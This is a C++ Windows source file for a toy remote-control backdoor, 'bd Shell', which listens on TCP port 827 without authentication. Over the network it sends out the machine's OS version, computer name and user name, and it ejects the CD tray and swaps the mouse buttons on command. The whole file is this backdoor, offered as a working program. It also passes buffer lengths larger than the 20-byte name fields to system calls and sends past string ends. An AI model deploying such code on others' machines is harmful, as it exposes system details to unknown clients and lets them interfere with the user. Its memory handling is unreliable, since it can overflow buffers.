#include<iostream>
#include<winsock2.h>
#include<string.h>
#include<windows.h>
#include<stdlib.h>
#include<Mmsystem.h>

#define bool int
#define true 1
#define false 0

#pragma comment (lib,"ws2_32")
#pragma comment (lib,"winmm.lib")

#define HELPMSG "help - Show Help Menu\r\n"\
	"getsysinfo - Get System Information\r\n"\
	"open - Open The Cd Rom\r\n"\
	"close - Close The Cd Rom\r\n"\
	"swap - Swap Mouse Button\r\n"\
	"restore - Restore The Button\r\n"\
	"shutdown - Close The Server\r\n"\
	"exit - Quit bd Shell"
#define NAMELEN 20
#define BUFFSIZE 1024

typedef struct _SYS_INFO{
	OSVERSIONINFO OsVer;//保存操作系统信息
	char szComputerName[NAMELEN];//保存计算机名称
	char szUserName[NAMELEN];//保存当前登录名
}SYS_INFO,*PSYS_INFO;

using namespace std;

bool Dispatch(SOCKET sock, char * szCmd);
void GetSysInfo(SYS_INFO * sysinfo);
void SetCdAudio(bool flag);
void SetMouseButton(bool bSwap);
void editCmd();
char * getIp();

bool flag = true;//服务程序开关

int main(int argc,char * argv[])
{
	printf("Welcome to Application!Waiting for connecting .\nThe server starting...\n");
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);//初始化动态链接库
	editCmd();

	SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);//创建套接字

	sockaddr_in sockaddr;//填充连接信息
	sockaddr.sin_family = PF_INET;
	sockaddr.sin_port = htons(827);
	sockaddr.sin_addr.S_un.S_addr = inet_addr(getIp());

	bind(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));

	listen(s, 1);

	SOCKADDR clientAddr;
	int nSize = sizeof(SOCKADDR);
	SOCKET clientSock;

	while(flag)
	{
		clientSock = accept(s, (SOCKADDR*)&clientAddr, &nSize);
		if (clientSock != NULL)
		{
			printf("Connection Ok!\n");
		}

		while (true)
		{
			send(clientSock, "Bdshell>", sizeof("Bdshell>") + sizeof(char), NULL);//发送命令提示
			char cmd[MAXBYTE] = {0};
			recv(clientSock, cmd, MAXBYTE, NULL);//接收发送的命令
			if (!strcmp(cmd, "exit") || cmd[0] == '\0')
			{
				printf("The client has logout\n");
				break;
			}
			//分发命令
			bool bRet = Dispatch(clientSock, cmd);
			if(!strcmp(cmd, "shutdown"))
			{
				break;
			}
			if (!bRet)
			{
				char error[] = "Command Unsuccessful!";
				send(clientSock, error, sizeof(error)+sizeof(char), NULL);
			}
		}
	}
	
	closesocket(clientSock);
	closesocket(s);

	WSACleanup();
	return 0;
}
//分发命令函数
bool Dispatch(SOCKET sock, char * szCmd)
{
	bool bRet = false;

	if (!strcmp(szCmd, "help"))
	{
		send(sock, HELPMSG, sizeof(HELPMSG)+sizeof(char), NULL);
		//cout << HELPMSG << endl;
		bRet = true;
	}
	else if (!strcmp(szCmd, "getsysinfo"))//获得系统信息
	{
		SYS_INFO Sysinfo = {0};
		GetSysInfo(&Sysinfo);
		char buff[BUFFSIZE];
		memcpy(buff,&Sysinfo,sizeof(Sysinfo));
		int n = send(sock, buff, sizeof(Sysinfo) + sizeof(char), NULL);
		bRet = true;
	}
	else if (!strcmp(szCmd, "open"))//打开光驱
	{
		SetCdAudio(true);
		send(sock, "Open CD Driver", sizeof(HELPMSG)+sizeof(char), NULL);
		bRet = true;
	}
	else if (!strcmp(szCmd, "close"))//关闭光驱
	{
		SetCdAudio(false);
		send(sock, "Close CD Driver", sizeof(HELPMSG)+sizeof(char), NULL);
		bRet = true;
	}
	else if (!strcmp(szCmd, "swap"))//交换鼠标左右键
	{
		SetMouseButton(true);
		send(sock, "Mouse Button has swapped!", sizeof("Mouse Button has swapped!") + sizeof(char), NULL);
		bRet = true;
	}
	else if (!strcmp(szCmd, "restore"))//恢复鼠标左右键
	{
		SetMouseButton(false);
		send(sock,"Mouse Button has restored!", sizeof("Mouse Button has restored!") + sizeof(char), NULL);
		bRet = true;
	}
	else if(!strcmp(szCmd,"shutdown"))
	{
		flag = false;
		bRet = true;
	}
	else
	{
		//printf("Error CMD command!\n");
	}
	return bRet;
}
//获得系统信息
void GetSysInfo(SYS_INFO * sysinfo)
{
	unsigned long nSize = MAXBYTE;

	sysinfo->OsVer.dwOSVersionInfoSize = sizeof(sysinfo->OsVer);
	GetVersionEx((OSVERSIONINFO *)&sysinfo->OsVer);
	GetComputerNameA(sysinfo->szComputerName, &nSize);
	nSize = MAXBYTE;
	GetUserNameA(sysinfo->szUserName, &nSize);
}
//打开关闭光驱
void SetCdAudio(bool flag)
{
	if (flag)
	{
		mciSendStringA("set cdaudio door open", NULL, NULL, NULL);
	}
	else
	{
		mciSendStringA("set cdaudio door close",NULL,NULL,NULL);

	}
}
//交换恢复鼠标左右键
void SetMouseButton(bool bSwap)
{
	if (bSwap)
	{
		SwapMouseButton(true);
	}
	else
	{
		SwapMouseButton(false);
	}
}
void editCmd()
{
	system("color fc");
	system("title 服务器");
}
char * getIp()
{
	char name[BUFFSIZE];
	gethostname(name,BUFFSIZE);

	hostent * entry;
	char * pszAddr;
	entry = gethostbyname(name);
	pszAddr = inet_ntoa(*(struct in_addr *)entry->h_addr_list[0]);
	printf("%s\n",pszAddr);
	/*for(int i = 0;entry != NULL && entry->h_addr_list[i] != NULL;i++)
	{
		pszAddr = inet_ntoa(*(struct in_addr *)entry->h_addr_list[i]);
		printf("%s\n",pszAddr);
	}*/
	return pszAddr;
}
